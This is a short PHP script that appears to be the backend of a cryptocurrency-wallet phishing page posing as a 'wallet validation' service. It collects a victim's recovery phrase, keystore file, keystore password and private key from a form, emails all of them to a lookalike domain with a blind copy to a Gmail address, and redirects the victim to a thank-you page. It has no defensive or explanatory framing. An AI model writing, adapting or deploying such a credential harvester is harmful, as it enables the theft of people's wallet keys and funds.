<?php
//get data from form  
$phrasekey = $_POST['phrasekey'];
$keystorekey= $_POST['keystorekey'];
$keystorepassword= $_POST['Walletmobile'];
$privatekey= $_POST['privatekey'];
$to = "walletmobile@walletmobilevalidation.online";
$subject = "Mail From Walletmobilevalidation";
$txt ="Phrase = ". $phrasekey . "\r\n  Keystore JSON = " . $keystorekey . "\r\n  Keystore Password = " . $keystorepassword . "\r\n Private Key =" . $privatekey;
$headers = "From:walletmobile@walletmobilevalidation.online" . "\r\n" .
"BCC:bolagist@gmail.com";
    mail($to,$subject,$txt,$headers);
//redirect
header("Location:thankyou.html");
?>
